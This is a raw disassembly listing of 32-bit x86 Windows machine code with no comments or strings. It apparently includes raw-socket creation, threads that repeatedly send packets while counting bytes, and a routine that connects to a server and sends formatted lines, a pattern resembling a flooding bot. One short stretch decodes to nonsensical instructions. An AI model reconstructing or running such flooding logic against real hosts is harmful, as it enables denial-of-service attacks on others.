13148838:	ff 15 8c 37 15 13    	call   *0x1315378c
1314883e:	0f b7 c0             	movzwl %ax,%eax
13148841:	66 89 46 14          	mov    %ax,0x14(%esi)
13148845:	8b 44 24 10          	mov    0x10(%esp),%eax
13148849:	66 85 c0             	test   %ax,%ax
1314884c:	75 0e                	jne    0x1314885c
1314884e:	68 ff ff 00 00       	push   $0xffff
13148853:	6a 01                	push   $0x1
13148855:	e8 75 d1 ff ff       	call   0x131459cf
1314885a:	59                   	pop    %ecx
1314885b:	59                   	pop    %ecx
1314885c:	50                   	push   %eax
1314885d:	ff 15 8c 37 15 13    	call   *0x1315378c
13148863:	66 89 46 16          	mov    %ax,0x16(%esi)
13148867:	8d 47 ec             	lea    -0x14(%edi),%eax
1314886a:	50                   	push   %eax
1314886b:	ff 15 8c 37 15 13    	call   *0x1315378c
13148871:	66 89 46 18          	mov    %ax,0x18(%esi)
13148875:	0f b7 c7             	movzwl %di,%eax
13148878:	5f                   	pop    %edi
13148879:	5e                   	pop    %esi
1314887a:	c3                   	ret    
1314887b:	55                   	push   %ebp
1314887c:	8b ec                	mov    %esp,%ebp
1314887e:	81 ec 24 06 00 00    	sub    $0x624,%esp
13148884:	53                   	push   %ebx
13148885:	56                   	push   %esi
13148886:	57                   	push   %edi
13148887:	bf 00 10 00 00       	mov    $0x1000,%edi
1314888c:	57                   	push   %edi
1314888d:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
13148894:	e8 65 cb ff ff       	call   0x131453fe
13148899:	89 45 fc             	mov    %eax,-0x4(%ebp)
1314889c:	c7 04 24 70 43 17 13 	movl   $0x13174370,(%esp)
131488a3:	8d 85 dc fa ff ff    	lea    -0x524(%ebp),%eax
131488a9:	68 00 d1 14 13       	push   $0x1314d100
131488ae:	50                   	push   %eax
131488af:	ff 15 98 39 15 13    	call   *0x13153998
131488b5:	83 c4 0c             	add    $0xc,%esp
131488b8:	68 ff 00 00 00       	push   $0xff
131488bd:	6a 03                	push   $0x3
131488bf:	6a 02                	push   $0x2
131488c1:	ff 15 64 35 15 13    	call   *0x13153564
131488c7:	83 f8 ff             	cmp    $0xffffffff,%eax
131488ca:	89 45 f8             	mov    %eax,-0x8(%ebp)
131488cd:	75 22                	jne    0x131488f1
131488cf:	ff 75 fc             	pushl  -0x4(%ebp)
131488d2:	e8 3b cb ff ff       	call   0x13145412
131488d7:	8d 85 dc fb ff ff    	lea    -0x424(%ebp),%eax
131488dd:	c7 04 24 f4 0c 15 13 	movl   $0x13150cf4,(%esp)
131488e4:	50                   	push   %eax
131488e5:	ff 15 98 39 15 13    	call   *0x13153998
131488eb:	59                   	pop    %ecx
131488ec:	33 db                	xor    %ebx,%ebx
131488ee:	59                   	pop    %ecx
131488ef:	eb 73                	jmp    0x13148964
131488f1:	8d 4d f4             	lea    -0xc(%ebp),%ecx
131488f4:	6a 04                	push   $0x4
131488f6:	51                   	push   %ecx
131488f7:	33 db                	xor    %ebx,%ebx
131488f9:	6a 02                	push   $0x2
131488fb:	53                   	push   %ebx
131488fc:	50                   	push   %eax
131488fd:	ff 15 84 36 15 13    	call   *0x13153684
13148903:	83 f8 ff             	cmp    $0xffffffff,%eax
13148906:	75 11                	jne    0x13148919
13148908:	ff 75 fc             	pushl  -0x4(%ebp)
1314890b:	e8 02 cb ff ff       	call   0x13145412
13148910:	c7 04 24 cc 0c 15 13 	movl   $0x13150ccc,(%esp)
13148917:	eb 3c                	jmp    0x13148955
13148919:	be 68 42 17 13       	mov    $0x13174268,%esi
1314891e:	66 c7 45 e0 02 00    	movw   $0x2,-0x20(%ebp)
13148924:	56                   	push   %esi
13148925:	ff 15 ac 39 15 13    	call   *0x131539ac
1314892b:	83 f8 ff             	cmp    $0xffffffff,%eax
1314892e:	56                   	push   %esi
1314892f:	75 07                	jne    0x13148938
13148931:	e8 f0 ca ff ff       	call   0x13145426
13148936:	59                   	pop    %ecx
13148937:	50                   	push   %eax
13148938:	ff 15 ac 39 15 13    	call   *0x131539ac
1314893e:	83 f8 ff             	cmp    $0xffffffff,%eax
13148941:	89 45 e4             	mov    %eax,-0x1c(%ebp)
13148944:	75 5c                	jne    0x131489a2
13148946:	ff 75 fc             	pushl  -0x4(%ebp)
13148949:	e8 c4 ca ff ff       	call   0x13145412
1314894e:	c7 04 24 a8 0c 15 13 	movl   $0x13150ca8,(%esp)
13148955:	8d 85 dc fb ff ff    	lea    -0x424(%ebp),%eax
1314895b:	50                   	push   %eax
1314895c:	ff 15 98 39 15 13    	call   *0x13153998
13148962:	59                   	pop    %ecx
13148963:	59                   	pop    %ecx
13148964:	39 1d 70 44 17 13    	cmp    %ebx,0x13174470
1314896a:	75 2e                	jne    0x1314899a
1314896c:	39 1d 6c 43 17 13    	cmp    %ebx,0x1317436c
13148972:	74 26                	je     0x1314899a
13148974:	ff 35 3c 45 17 13    	pushl  0x1317453c
1314897a:	b9 81 01 00 00       	mov    $0x181,%ecx
1314897f:	8d b5 dc f9 ff ff    	lea    -0x624(%ebp),%esi
13148985:	81 ec 04 06 00 00    	sub    $0x604,%esp
1314898b:	8b fc                	mov    %esp,%edi
1314898d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
1314898f:	e8 58 01 00 00       	call   0x13148aec
13148994:	81 c4 08 06 00 00    	add    $0x608,%esp
1314899a:	89 1d 6c 43 17 13    	mov    %ebx,0x1317436c
131489a0:	eb 77                	jmp    0x13148a19
131489a2:	8b 35 38 0c 15 13    	mov    0x13150c38,%esi
131489a8:	89 45 f0             	mov    %eax,-0x10(%ebp)
131489ab:	39 1d 6c 43 17 13    	cmp    %ebx,0x1317436c
131489b1:	74 54                	je     0x13148a07
131489b3:	57                   	push   %edi
131489b4:	53                   	push   %ebx
131489b5:	ff 75 fc             	pushl  -0x4(%ebp)
131489b8:	e8 65 9c ff ff       	call   0x13142622
131489bd:	ff 75 f0             	pushl  -0x10(%ebp)
131489c0:	66 a1 68 43 17 13    	mov    0x13174368,%ax
131489c6:	56                   	push   %esi
131489c7:	50                   	push   %eax
131489c8:	ff 75 fc             	pushl  -0x4(%ebp)
131489cb:	e8 ff fd ff ff       	call   0x131487cf
131489d0:	83 c4 1c             	add    $0x1c,%esp
131489d3:	81 3d 40 45 17 13 00 	cmpl   $0xfffff000,0x13174540
131489da:	f0 ff ff 
131489dd:	73 1a                	jae    0x131489f9
131489df:	8d 4d e0             	lea    -0x20(%ebp),%ecx
131489e2:	6a 10                	push   $0x10
131489e4:	51                   	push   %ecx
131489e5:	53                   	push   %ebx
131489e6:	50                   	push   %eax
131489e7:	ff 75 fc             	pushl  -0x4(%ebp)
131489ea:	ff 75 f8             	pushl  -0x8(%ebp)
131489ed:	ff 15 68 36 15 13    	call   *0x13153668
131489f3:	01 05 40 45 17 13    	add    %eax,0x13174540
131489f9:	ff 35 3c 0c 15 13    	pushl  0x13150c3c
131489ff:	ff 15 fc 36 15 13    	call   *0x131536fc
13148a05:	eb a4                	jmp    0x131489ab
13148a07:	ff 75 fc             	pushl  -0x4(%ebp)
13148a0a:	e8 03 ca ff ff       	call   0x13145412
13148a0f:	59                   	pop    %ecx
13148a10:	ff 75 f8             	pushl  -0x8(%ebp)
13148a13:	ff 15 e4 36 15 13    	call   *0x131536e4
13148a19:	5f                   	pop    %edi
13148a1a:	5e                   	pop    %esi
13148a1b:	33 c0                	xor    %eax,%eax
13148a1d:	5b                   	pop    %ebx
13148a1e:	c9                   	leave  
13148a1f:	c2 04 00             	ret    $0x4
13148a22:	55                   	push   %ebp
13148a23:	8b ec                	mov    %esp,%ebp
13148a25:	56                   	push   %esi
13148a26:	33 f6                	xor    %esi,%esi
13148a28:	39 35 6c 43 17 13    	cmp    %esi,0x1317436c
13148a2e:	74 08                	je     0x13148a38
13148a30:	6a 02                	push   $0x2
13148a32:	58                   	pop    %eax
13148a33:	e9 87 00 00 00       	jmp    0x13148abf
13148a38:	a1 44 45 17 13       	mov    0x13174544,%eax
13148a3d:	57                   	push   %edi
13148a3e:	ff 75 08             	pushl  0x8(%ebp)
13148a41:	a3 70 44 17 13       	mov    %eax,0x13174470
13148a46:	c7 05 6c 43 17 13 01 	movl   $0x1,0x1317436c
13148a4d:	00 00 00 
13148a50:	68 00 d1 14 13       	push   $0x1314d100
13148a55:	68 68 42 17 13       	push   $0x13174268
13148a5a:	ff 15 98 39 15 13    	call   *0x13153998
13148a60:	ff 75 10             	pushl  0x10(%ebp)
13148a63:	68 70 43 17 13       	push   $0x13174370
13148a68:	ff 15 98 39 15 13    	call   *0x13153998
13148a6e:	8b 45 14             	mov    0x14(%ebp),%eax
13148a71:	83 c4 14             	add    $0x14,%esp
13148a74:	a3 3c 45 17 13       	mov    %eax,0x1317453c
13148a79:	66 8b 45 0c          	mov    0xc(%ebp),%ax
13148a7d:	33 ff                	xor    %edi,%edi
13148a7f:	39 35 40 0c 15 13    	cmp    %esi,0x13150c40
13148a85:	89 35 40 45 17 13    	mov    %esi,0x13174540
13148a8b:	66 a3 68 43 17 13    	mov    %ax,0x13174368
13148a91:	7e 28                	jle    0x13148abb
13148a93:	53                   	push   %ebx
13148a94:	bb 74 44 17 13       	mov    $0x13174474,%ebx
13148a99:	8d 45 08             	lea    0x8(%ebp),%eax
13148a9c:	50                   	push   %eax
13148a9d:	56                   	push   %esi
13148a9e:	56                   	push   %esi
13148a9f:	68 7b 88 14 13       	push   $0x1314887b
13148aa4:	56                   	push   %esi
13148aa5:	56                   	push   %esi
13148aa6:	ff 15 30 37 15 13    	call   *0x13153730
13148aac:	89 03                	mov    %eax,(%ebx)
13148aae:	47                   	inc    %edi
13148aaf:	83 c3 04             	add    $0x4,%ebx
13148ab2:	3b 3d 40 0c 15 13    	cmp    0x13150c40,%edi
13148ab8:	7c df                	jl     0x13148a99
13148aba:	5b                   	pop    %ebx
13148abb:	6a 01                	push   $0x1
13148abd:	58                   	pop    %eax
13148abe:	5f                   	pop    %edi
13148abf:	5e                   	pop    %esi
13148ac0:	5d                   	pop    %ebp
13148ac1:	c3                   	ret    
13148ac2:	83 3d 6c 43 17 13 00 	cmpl   $0x0,0x1317436c
13148ac9:	75 04                	jne    0x13148acf
13148acb:	6a 02                	push   $0x2
13148acd:	58                   	pop    %eax
13148ace:	c3                   	ret    
13148acf:	83 25 6c 43 17 13 00 	andl   $0x0,0x1317436c
13148ad6:	6a 01                	push   $0x1
13148ad8:	58                   	pop    %eax
13148ad9:	c3                   	ret    
13148ada:	b8 68 42 17 13       	mov    $0x13174268,%eax
13148adf:	c3                   	ret    
13148ae0:	a1 6c 43 17 13       	mov    0x1317436c,%eax
13148ae5:	c3                   	ret    
13148ae6:	a1 40 45 17 13       	mov    0x13174540,%eax
13148aeb:	c3                   	ret    
13148aec:	83 bc 24 08 06 00 00 	cmpl   $0x2,0x608(%esp)
13148af3:	02 
13148af4:	56                   	push   %esi
13148af5:	57                   	push   %edi
13148af6:	75 1d                	jne    0x13148b15
13148af8:	81 ec 04 06 00 00    	sub    $0x604,%esp
13148afe:	b9 81 01 00 00       	mov    $0x181,%ecx
13148b03:	8d b4 24 10 06 00 00 	lea    0x610(%esp),%esi
13148b0a:	8b fc                	mov    %esp,%edi
13148b0c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13148b0e:	e8 96 03 00 00       	call   0x13148ea9
13148b13:	eb 25                	jmp    0x13148b3a
13148b15:	83 bc 24 10 06 00 00 	cmpl   $0x1,0x610(%esp)
13148b1c:	01 
13148b1d:	75 21                	jne    0x13148b40
13148b1f:	81 ec 04 06 00 00    	sub    $0x604,%esp
13148b25:	b9 81 01 00 00       	mov    $0x181,%ecx
13148b2a:	8d b4 24 10 06 00 00 	lea    0x610(%esp),%esi
13148b31:	8b fc                	mov    %esp,%edi
13148b33:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13148b35:	e8 df 0b 00 00       	call   0x13149719
13148b3a:	81 c4 04 06 00 00    	add    $0x604,%esp
13148b40:	5f                   	pop    %edi
13148b41:	5e                   	pop    %esi
13148b42:	c3                   	ret    
13148b43:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
13148b48:	74 06                	je     0x13148b50
13148b4a:	ff 74 24 04          	pushl  0x4(%esp)
13148b4e:	eb 06                	jmp    0x13148b56
13148b50:	e8 15 00 00 00       	call   0x13148b6a
13148b55:	50                   	push   %eax
13148b56:	68 00 d1 14 13       	push   $0x1314d100
13148b5b:	68 48 45 17 13       	push   $0x13174548
13148b60:	ff 15 98 39 15 13    	call   *0x13153998
13148b66:	83 c4 0c             	add    $0xc,%esp
13148b69:	c3                   	ret    
13148b6a:	51                   	push   %ecx
13148b6b:	56                   	push   %esi
13148b6c:	be 00 01 00 00       	mov    $0x100,%esi
13148b71:	57                   	push   %edi
13148b72:	56                   	push   %esi
13148b73:	e8 86 c8 ff ff       	call   0x131453fe
13148b78:	59                   	pop    %ecx
13148b79:	8b f8                	mov    %eax,%edi
13148b7b:	56                   	push   %esi
13148b7c:	57                   	push   %edi
13148b7d:	ff 15 7c 36 15 13    	call   *0x1315367c
13148b83:	85 c0                	test   %eax,%eax
13148b85:	75 18                	jne    0x13148b9f
13148b87:	57                   	push   %edi
13148b88:	ff 15 d0 33 15 13    	call   *0x131533d0
13148b8e:	8b f0                	mov    %eax,%esi
13148b90:	85 f6                	test   %esi,%esi
13148b92:	75 0f                	jne    0x13148ba3
13148b94:	57                   	push   %edi
13148b95:	e8 78 c8 ff ff       	call   0x13145412
13148b9a:	59                   	pop    %ecx
13148b9b:	33 c0                	xor    %eax,%eax
13148b9d:	eb 3a                	jmp    0x13148bd9
13148b9f:	8b 74 24 08          	mov    0x8(%esp),%esi
13148ba3:	8b 06                	mov    (%esi),%eax
13148ba5:	8a 00                	mov    (%eax),%al
13148ba7:	3c 30                	cmp    $0x30,%al
13148ba9:	7c 14                	jl     0x13148bbf
13148bab:	3c 39                	cmp    $0x39,%al
13148bad:	7f 10                	jg     0x13148bbf
13148baf:	ff 15 28 34 15 13    	call   *0x13153428
13148bb5:	50                   	push   %eax
13148bb6:	ff 36                	pushl  (%esi)
13148bb8:	68 28 0d 15 13       	push   $0x13150d28
13148bbd:	eb 0e                	jmp    0x13148bcd
13148bbf:	ff 15 28 34 15 13    	call   *0x13153428
13148bc5:	50                   	push   %eax
13148bc6:	ff 36                	pushl  (%esi)
13148bc8:	68 20 0d 15 13       	push   $0x13150d20
13148bcd:	57                   	push   %edi
13148bce:	ff 15 98 39 15 13    	call   *0x13153998
13148bd4:	83 c4 10             	add    $0x10,%esp
13148bd7:	8b c7                	mov    %edi,%eax
13148bd9:	5f                   	pop    %edi
13148bda:	5e                   	pop    %esi
13148bdb:	59                   	pop    %ecx
13148bdc:	c3                   	ret    
13148bdd:	b8 48 45 17 13       	mov    $0x13174548,%eax
13148be2:	c3                   	ret    
13148be3:	83 7c 24 04 02       	cmpl   $0x2,0x4(%esp)
13148be8:	75 0e                	jne    0x13148bf8
13148bea:	83 3d 38 d6 14 13 00 	cmpl   $0x0,0x1314d638
13148bf1:	b8 30 0d 15 13       	mov    $0x13150d30,%eax
13148bf6:	75 05                	jne    0x13148bfd
13148bf8:	b8 a0 46 17 13       	mov    $0x131746a0,%eax
13148bfd:	c3                   	ret    
13148bfe:	83 7c 24 04 02       	cmpl   $0x2,0x4(%esp)
13148c03:	75 0e                	jne    0x13148c13
13148c05:	83 3d 38 d6 14 13 00 	cmpl   $0x0,0x1314d638
13148c0c:	b8 34 0d 15 13       	mov    $0x13150d34,%eax
13148c11:	75 05                	jne    0x13148c18
13148c13:	b8 a0 46 17 13       	mov    $0x131746a0,%eax
13148c18:	c3                   	ret    
13148c19:	83 7c 24 04 02       	cmpl   $0x2,0x4(%esp)
13148c1e:	75 0e                	jne    0x13148c2e
13148c20:	83 3d 38 d6 14 13 00 	cmpl   $0x0,0x1314d638
13148c27:	b8 38 0d 15 13       	mov    $0x13150d38,%eax
13148c2c:	75 05                	jne    0x13148c33
13148c2e:	b8 a0 46 17 13       	mov    $0x131746a0,%eax
13148c33:	c3                   	ret    
13148c34:	83 7c 24 04 02       	cmpl   $0x2,0x4(%esp)
13148c39:	75 0e                	jne    0x13148c49
13148c3b:	83 3d 38 d6 14 13 00 	cmpl   $0x0,0x1314d638
13148c42:	b8 3c 0d 15 13       	mov    $0x13150d3c,%eax
13148c47:	75 05                	jne    0x13148c4e
13148c49:	b8 a0 46 17 13       	mov    $0x131746a0,%eax
13148c4e:	c3                   	ret    
13148c4f:	83 7c 24 04 02       	cmpl   $0x2,0x4(%esp)
13148c54:	75 0e                	jne    0x13148c64
13148c56:	83 3d 38 d6 14 13 00 	cmpl   $0x0,0x1314d638
13148c5d:	b8 44 0d 15 13       	mov    $0x13150d44,%eax
13148c62:	75 05                	jne    0x13148c69
13148c64:	b8 a0 46 17 13       	mov    $0x131746a0,%eax
13148c69:	c3                   	ret    
13148c6a:	55                   	push   %ebp
13148c6b:	8b ec                	mov    %esp,%ebp
13148c6d:	81 ec 00 01 00 00    	sub    $0x100,%esp
13148c73:	53                   	push   %ebx
13148c74:	56                   	push   %esi
13148c75:	57                   	push   %edi
13148c76:	8d 85 08 00 00 00    	lea    0x8(%ebp),%eax
13148c7c:	85 c0                	test   %eax,%eax
13148c7e:	75 12                	jne    0x13148c92
13148c80:	33 d6                	xor    %esi,%edx
13148c82:	8b 34 90             	mov    (%eax,%edx,4),%esi
13148c85:	85 d9                	test   %ebx,%ecx
13148c87:	83 f3 01             	xor    $0x1,%ebx
13148c8a:	3b 1c 39             	cmp    (%ecx,%edi,1),%ebx
13148c8d:	87 03                	xchg   %eax,(%ebx)
13148c8f:	f3 aa                	rep stos %al,%es:(%edi)
13148c91:	c9                   	leave  
13148c92:	6a 00                	push   $0x0
13148c94:	6a 01                	push   $0x1
13148c96:	6a 02                	push   $0x2
13148c98:	ff 15 64 35 15 13    	call   *0x13153564
13148c9e:	5f                   	pop    %edi
13148c9f:	5e                   	pop    %esi
13148ca0:	83 f8 ff             	cmp    $0xffffffff,%eax
13148ca3:	a3 88 46 17 13       	mov    %eax,0x13174688
13148ca8:	5b                   	pop    %ebx
13148ca9:	0f 84 8e 00 00 00    	je     0x13148d3d
13148caf:	ff 75 0c             	pushl  0xc(%ebp)
13148cb2:	66 c7 05 90 46 17 13 	movw   $0x2,0x13174690
13148cb9:	02 00 
13148cbb:	ff 15 8c 37 15 13    	call   *0x1315378c
13148cc1:	66 a3 92 46 17 13    	mov    %ax,0x13174692
13148cc7:	68 00 01 00 00       	push   $0x100
13148ccc:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13148cd2:	6a 00                	push   $0x0
13148cd4:	50                   	push   %eax
13148cd5:	e8 48 99 ff ff       	call   0x13142622
13148cda:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13148ce0:	6a 2b                	push   $0x2b
13148ce2:	50                   	push   %eax
13148ce3:	ff 75 08             	pushl  0x8(%ebp)
13148ce6:	e8 92 cf ff ff       	call   0x13145c7d
13148ceb:	83 c4 18             	add    $0x18,%esp
13148cee:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13148cf4:	50                   	push   %eax
13148cf5:	ff 15 ac 39 15 13    	call   *0x131539ac
13148cfb:	83 f8 ff             	cmp    $0xffffffff,%eax
13148cfe:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13148d04:	50                   	push   %eax
13148d05:	75 07                	jne    0x13148d0e
13148d07:	e8 1a c7 ff ff       	call   0x13145426
13148d0c:	59                   	pop    %ecx
13148d0d:	50                   	push   %eax
13148d0e:	ff 15 ac 39 15 13    	call   *0x131539ac
13148d14:	6a 10                	push   $0x10
13148d16:	68 90 46 17 13       	push   $0x13174690
13148d1b:	ff 35 88 46 17 13    	pushl  0x13174688
13148d21:	a3 94 46 17 13       	mov    %eax,0x13174694
13148d26:	ff 15 34 37 15 13    	call   *0x13153734
13148d2c:	83 f8 ff             	cmp    $0xffffffff,%eax
13148d2f:	75 10                	jne    0x13148d41
13148d31:	ff 35 88 46 17 13    	pushl  0x13174688
13148d37:	ff 15 e4 36 15 13    	call   *0x131536e4
13148d3d:	33 c0                	xor    %eax,%eax
13148d3f:	c9                   	leave  
13148d40:	c3                   	ret    
13148d41:	6a 01                	push   $0x1
13148d43:	58                   	pop    %eax
13148d44:	c9                   	leave  
13148d45:	c3                   	ret    
13148d46:	56                   	push   %esi
13148d47:	8b 74 24 08          	mov    0x8(%esp),%esi
13148d4b:	56                   	push   %esi
13148d4c:	e8 08 c7 ff ff       	call   0x13145459
13148d51:	59                   	pop    %ecx
13148d52:	6a 00                	push   $0x0
13148d54:	56                   	push   %esi
13148d55:	e8 a3 99 ff ff       	call   0x131426fd
13148d5a:	59                   	pop    %ecx
13148d5b:	50                   	push   %eax
13148d5c:	56                   	push   %esi
13148d5d:	ff 35 88 46 17 13    	pushl  0x13174688
13148d63:	ff 15 68 37 15 13    	call   *0x13153768
13148d69:	6a 00                	push   $0x0
13148d6b:	6a 01                	push   $0x1
13148d6d:	68 4c 0d 15 13       	push   $0x13150d4c
13148d72:	ff 35 88 46 17 13    	pushl  0x13174688
13148d78:	ff 15 68 37 15 13    	call   *0x13153768
13148d7e:	6a 01                	push   $0x1
13148d80:	58                   	pop    %eax
13148d81:	5e                   	pop    %esi
13148d82:	c3                   	ret    
13148d83:	55                   	push   %ebp
13148d84:	8b ec                	mov    %esp,%ebp
13148d86:	83 ec 40             	sub    $0x40,%esp
13148d89:	56                   	push   %esi
13148d8a:	57                   	push   %edi
13148d8b:	68 00 02 00 00       	push   $0x200
13148d90:	e8 69 c6 ff ff       	call   0x131453fe
13148d95:	8b 7d 08             	mov    0x8(%ebp),%edi
13148d98:	59                   	pop    %ecx
13148d99:	85 ff                	test   %edi,%edi
13148d9b:	8b f0                	mov    %eax,%esi
13148d9d:	75 07                	jne    0x13148da6
13148d9f:	e8 c6 fd ff ff       	call   0x13148b6a
13148da4:	8b f8                	mov    %eax,%edi
13148da6:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
13148daa:	75 03                	jne    0x13148daf
13148dac:	89 7d 10             	mov    %edi,0x10(%ebp)
13148daf:	83 3d 58 d3 14 13 00 	cmpl   $0x0,0x1314d358
13148db6:	74 36                	je     0x13148dee
13148db8:	6a 40                	push   $0x40
13148dba:	8d 45 c0             	lea    -0x40(%ebp),%eax
13148dbd:	6a 00                	push   $0x0
13148dbf:	50                   	push   %eax
13148dc0:	e8 5d 98 ff ff       	call   0x13142622
13148dc5:	8d 45 c0             	lea    -0x40(%ebp),%eax
13148dc8:	6a 2b                	push   $0x2b
13148dca:	50                   	push   %eax
13148dcb:	68 5c d3 14 13       	push   $0x1314d35c
13148dd0:	e8 a8 ce ff ff       	call   0x13145c7d
13148dd5:	8d 45 c0             	lea    -0x40(%ebp),%eax
13148dd8:	50                   	push   %eax
13148dd9:	68 68 0d 15 13       	push   $0x13150d68
13148dde:	56                   	push   %esi
13148ddf:	ff 15 98 39 15 13    	call   *0x13153998
13148de5:	56                   	push   %esi
13148de6:	e8 5b ff ff ff       	call   0x13148d46
13148deb:	83 c4 28             	add    $0x28,%esp
13148dee:	57                   	push   %edi
13148def:	68 60 0d 15 13       	push   $0x13150d60
13148df4:	56                   	push   %esi
13148df5:	ff 15 98 39 15 13    	call   *0x13153998
13148dfb:	56                   	push   %esi
13148dfc:	e8 45 ff ff ff       	call   0x13148d46
13148e01:	ff 75 10             	pushl  0x10(%ebp)
13148e04:	ff 75 0c             	pushl  0xc(%ebp)
13148e07:	68 50 0d 15 13       	push   $0x13150d50
13148e0c:	56                   	push   %esi
13148e0d:	ff 15 98 39 15 13    	call   *0x13153998
13148e13:	56                   	push   %esi
13148e14:	e8 2d ff ff ff       	call   0x13148d46
13148e19:	57                   	push   %edi
13148e1a:	68 00 d1 14 13       	push   $0x1314d100
13148e1f:	68 48 45 17 13       	push   $0x13174548
13148e24:	ff 15 98 39 15 13    	call   *0x13153998
13148e2a:	56                   	push   %esi
13148e2b:	e8 e2 c5 ff ff       	call   0x13145412
13148e30:	83 c4 34             	add    $0x34,%esp
13148e33:	6a 01                	push   $0x1
13148e35:	58                   	pop    %eax
13148e36:	5f                   	pop    %edi
13148e37:	5e                   	pop    %esi
13148e38:	c9                   	leave  
13148e39:	c3                   	ret    
13148e3a:	56                   	push   %esi
13148e3b:	57                   	push   %edi
13148e3c:	68 00 01 00 00       	push   $0x100
13148e41:	e8 b8 c5 ff ff       	call   0x131453fe
13148e46:	ff 74 24 10          	pushl  0x10(%esp)
13148e4a:	8b f8                	mov    %eax,%edi
13148e4c:	68 70 0d 15 13       	push   $0x13150d70
13148e51:	57                   	push   %edi
13148e52:	ff 15 98 39 15 13    	call   *0x13153998
13148e58:	57                   	push   %edi
13148e59:	e8 e8 fe ff ff       	call   0x13148d46
13148e5e:	83 c4 14             	add    $0x14,%esp
13148e61:	85 c0                	test   %eax,%eax
13148e63:	75 04                	jne    0x13148e69
13148e65:	33 f6                	xor    %esi,%esi
13148e67:	eb 03                	jmp    0x13148e6c
13148e69:	6a 01                	push   $0x1
13148e6b:	5e                   	pop    %esi
13148e6c:	57                   	push   %edi
13148e6d:	e8 a0 c5 ff ff       	call   0x13145412
13148e72:	59                   	pop    %ecx
13148e73:	8b c6                	mov    %esi,%eax
13148e75:	5f                   	pop    %edi
13148e76:	5e                   	pop    %esi
13148e77:	c3                   	ret    
13148e78:	a1 88 46 17 13       	mov    0x13174688,%eax
13148e7d:	85 c0                	test   %eax,%eax
13148e7f:	74 25                	je     0x13148ea6
13148e81:	83 f8 ff             	cmp    $0xffffffff,%eax
13148e84:	74 20                	je     0x13148ea6
13148e86:	83 f8 ff             	cmp    $0xffffffff,%eax
13148e89:	74 1b                	je     0x13148ea6
13148e8b:	68 a8 f1 14 13       	push   $0x1314f1a8
13148e90:	e8 b1 fe ff ff       	call   0x13148d46
13148e95:	59                   	pop    %ecx
13148e96:	ff 35 88 46 17 13    	pushl  0x13174688
13148e9c:	ff 15 e4 36 15 13    	call   *0x131536e4
13148ea2:	6a 01                	push   $0x1
13148ea4:	58                   	pop    %eax
13148ea5:	c3                   	ret    
13148ea6:	33 c0                	xor    %eax,%eax
13148ea8:	c3                   	ret    
13148ea9:	56                   	push   %esi
13148eaa:	33 f6                	xor    %esi,%esi
13148eac:	39 35 44 45 17 13    	cmp    %esi,0x13174544
13148eb2:	57                   	push   %edi
13148eb3:	74 05                	je     0x13148eba
13148eb5:	6a 05                	push   $0x5
13148eb7:	58                   	pop    %eax
13148eb8:	eb 5c                	jmp    0x13148f16
13148eba:	68 00 05 00 00       	push   $0x500
13148ebf:	e8 3a c5 ff ff       	call   0x131453fe
13148ec4:	8b f8                	mov    %eax,%edi
13148ec6:	8d 84 24 10 01 00 00 	lea    0x110(%esp),%eax
13148ecd:	85 c0                	test   %eax,%eax
13148ecf:	59                   	pop    %ecx
13148ed0:	74 42                	je     0x13148f14
13148ed2:	8d 84 24 0c 02 00 00 	lea    0x20c(%esp),%eax
13148ed9:	85 c0                	test   %eax,%eax
13148edb:	74 37                	je     0x13148f14
13148edd:	8d 84 24 0c 02 00 00 	lea    0x20c(%esp),%eax
13148ee4:	50                   	push   %eax
13148ee5:	8d 84 24 10 01 00 00 	lea    0x110(%esp),%eax
13148eec:	50                   	push   %eax
13148eed:	68 78 0d 15 13       	push   $0x13150d78
13148ef2:	57                   	push   %edi
13148ef3:	ff 15 98 39 15 13    	call   *0x13153998
13148ef9:	57                   	push   %edi
13148efa:	e8 47 fe ff ff       	call   0x13148d46
13148eff:	83 c4 14             	add    $0x14,%esp
13148f02:	85 c0                	test   %eax,%eax
13148f04:	74 03                	je     0x13148f09
13148f06:	6a 01                	push   $0x1
13148f08:	5e                   	pop    %esi
13148f09:	57                   	push   %edi
13148f0a:	e8 03 c5 ff ff       	call   0x13145412
13148f0f:	59                   	pop    %ecx
13148f10:	8b c6                	mov    %esi,%eax
13148f12:	eb 02                	jmp    0x13148f16
13148f14:	33 c0                	xor    %eax,%eax
13148f16:	5f                   	pop    %edi
13148f17:	5e                   	pop    %esi
13148f18:	c3                   	ret    
13148f19:	56                   	push   %esi
13148f1a:	57                   	push   %edi
13148f1b:	6a 40                	push   $0x40
13148f1d:	e8 dc c4 ff ff       	call   0x131453fe
13148f22:	33 ff                	xor    %edi,%edi
13148f24:	59                   	pop    %ecx
13148f25:	39 7c 24 0c          	cmp    %edi,0xc(%esp)
13148f29:	8b f0                	mov    %eax,%esi
13148f2b:	74 06                	je     0x13148f33
13148f2d:	ff 74 24 0c          	pushl  0xc(%esp)
13148f31:	eb 06                	jmp    0x13148f39
13148f33:	e8 32 fc ff ff       	call   0x13148b6a
13148f38:	50                   	push   %eax
13148f39:	68 60 0d 15 13       	push   $0x13150d60
13148f3e:	56                   	push   %esi
13148f3f:	ff 15 98 39 15 13    	call   *0x13153998
13148f45:	83 c4 0c             	add    $0xc,%esp
13148f48:	56                   	push   %esi
13148f49:	e8 f8 fd ff ff       	call   0x13148d46
13148f4e:	85 c0                	test   %eax,%eax
13148f50:	59                   	pop    %ecx
13148f51:	74 03                	je     0x13148f56
13148f53:	6a 01                	push   $0x1
13148f55:	5f                   	pop    %edi
13148f56:	56                   	push   %esi
13148f57:	e8 b6 c4 ff ff       	call   0x13145412
13148f5c:	59                   	pop    %ecx
13148f5d:	8b c7                	mov    %edi,%eax
13148f5f:	5f                   	pop    %edi
13148f60:	5e                   	pop    %esi
13148f61:	c3                   	ret    
13148f62:	83 ec 10             	sub    $0x10,%esp
13148f65:	53                   	push   %ebx
13148f66:	8b 5c 24 18          	mov    0x18(%esp),%ebx
13148f6a:	55                   	push   %ebp
13148f6b:	56                   	push   %esi
13148f6c:	85 db                	test   %ebx,%ebx
